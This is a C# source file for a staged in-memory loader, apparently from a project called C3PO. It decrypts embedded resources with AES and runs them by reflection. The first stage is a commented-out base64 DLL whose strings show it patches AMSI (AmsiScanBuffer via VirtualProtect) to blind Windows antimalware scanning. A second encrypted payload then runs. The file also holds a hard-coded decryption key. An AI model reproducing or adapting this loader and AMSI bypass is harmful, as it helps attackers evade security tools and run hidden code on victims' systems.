using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Security.Cryptography;
using Starter;
using System.IO;

namespace EntryPoint
{
    internal class Entry
    {
       

        static void Main(string[] args)
        {
            Start();
        }

        public static void Start()
        {
#if DEBUG
            Console.WriteLine("Running Decoder.");
#endif

            var asm = Decrypt(Encoding.UTF8.GetString(Starter.Properties.Resources.Patcher), Starter.Properties.Resources.PatchKey);
            //var patcher = "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";
            //var asm = Decrypt(patcher, "kJstMD4IEG203ziHGxxgkPZVFGvgAN6zVDhnLyG8dkUhWjj5");
            //var asm = Convert.FromBase64String("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wCwAAAIABIAAAAEAAAAAAAAAAAAAAAAAUAMAAAQAAAAAAAAAAAAAAFcA4wAAAAAABAADAAAAAAAARDg0RjRDMTIwMDA1RjE4MzdEQzY1QzA0MTgxRjNEQTk0NjZCMTIzRkMzNjlDMzU5QTMwMUJBQkMxMjA2MTU3MABrZXJuZWwzMgBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTYAZ2V0X1VURjgAPE1vZHVsZT4APFByaXZhdGVJbXBsZW1lbnRhdGlvbkRldGFpbHM+ADBDNTBDNjdFODM5NDcyQ0Q2MTJENjAzMzEwOUY1RTAzMjk4N0U0OEUzNjcyNDdGMjlDMEVCMzBBMUQzRUI1RkMAUGF0Y2hBTVNJAG1zY29ybGliAGRlYwBlbmMAUnVudGltZUZpZWxkSGFuZGxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0ZQBnZXRfU2l6ZQBkd1NpemUARW5jb2RpbmcAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBGcm9tQmFzZTY0U3RyaW5nAEdldFN0cmluZwBnZXRfR2V0UGF0Y2gATWFyc2hhbABQYXRjaGVyLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24ARXhjZXB0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");
            //var asm = File.ReadAllBytes(@"E:\Share\Projects\C3PO\Payload\PatcherDll\bin\x64\Debug\Patcher.dll");
            Execute(asm);

#if DEBUG
            Console.WriteLine("Decrypting.");
#endif
            asm = Decrypt(Encoding.UTF8.GetString(Starter.Properties.Resources.Payload), Starter.Properties.Resources.Key);
#if DEBUG
            Console.WriteLine("Executing.");
#endif
            Execute(asm);

#if DEBUG
            Console.WriteLine("Executed.");
#endif
        }

        private static byte[] Decrypt(string b64, string secretKey)
        {
            var src = Convert.FromBase64String(b64);
            var bytes = Encoding.UTF8.GetBytes(secretKey);

            byte[] key = bytes.Take(32).ToArray();
            byte[] iv = bytes.Take(16).ToArray();

            RijndaelManaged rijndael = new RijndaelManaged();
            rijndael.KeySize = 256;
            rijndael.BlockSize = 128;
            rijndael.Key = key;
            rijndael.IV = iv;
            rijndael.Padding = PaddingMode.PKCS7;

            byte[] decryptedBytes = rijndael.CreateDecryptor().TransformFinalBlock(src, 0, src.Length);
            return decryptedBytes;
        }

        private static void Execute(byte[] assemblyBytes)
        {
            var assembly = System.Reflection.Assembly.Load(assemblyBytes);
            var type = assembly.GetType("EntryPoint.Entry");
            if(type == null)
            {
                throw new InvalidOperationException("EntryPoint.Entry is null");
            }
            var method = type.GetMethod("Start", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            method.Invoke(null, new object[] { });
        }
    }
}

